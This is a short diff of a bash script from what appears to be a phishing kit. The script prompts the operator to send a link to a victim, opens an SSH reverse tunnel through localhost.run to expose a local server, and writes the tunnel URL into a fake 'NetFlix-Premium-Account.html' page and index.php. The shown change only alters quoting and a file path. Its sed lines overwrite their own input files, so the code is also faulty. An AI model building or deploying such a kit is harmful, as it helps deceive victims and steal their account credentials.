@@ -187,10 +187,10 @@ printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to vic
 printf "\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Serveo is Currently Down . So input this command in new tab to Get The link \n'
 printf "\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m ssh -R 80:localhost:$port ssh.localhost.run \n'
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m ssh -R 80:localhost:$port ssh.localhost.run \n"
 printf "\n"
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .www/.servlink)
 
 sed 's+forwarding_link+'$send_link'+g' NetFlix-Premium-Account.html > NetFlix-Premium-Account.html
 sed 's+forwarding_link+'$send_link'+g' index.php > index.php
